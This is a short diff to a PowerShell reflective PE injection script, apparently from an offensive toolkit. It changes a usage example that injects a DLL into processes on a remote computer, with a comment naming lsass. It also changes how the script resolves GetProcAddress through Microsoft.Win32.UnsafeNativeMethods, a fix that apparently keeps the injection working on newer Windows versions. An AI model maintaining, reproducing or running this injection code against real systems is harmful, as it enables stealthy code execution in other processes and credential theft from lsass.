@@ -47,7 +47,7 @@ Optional, will not wipe the MZ from the first two bytes of the PE. This is to be
 .EXAMPLE
 
 Refectively the msgbox dll in to the lsass process on a remote computer.
-Invoke-ReflectivePEInjection -ProcName explorer -ComputerName Target.Local
+Invoke-ReflectivePEInjection -ProcName explorer
 #>
 
 [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
@@ -885,7 +885,7 @@ $RemoteScriptBlock = {
         $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
         # Get a reference to the GetModuleHandle and GetProcAddress methods
         $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
-        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
+        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
         # Get a handle to the module specified
         $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
         $tmpPtr = New-Object IntPtr
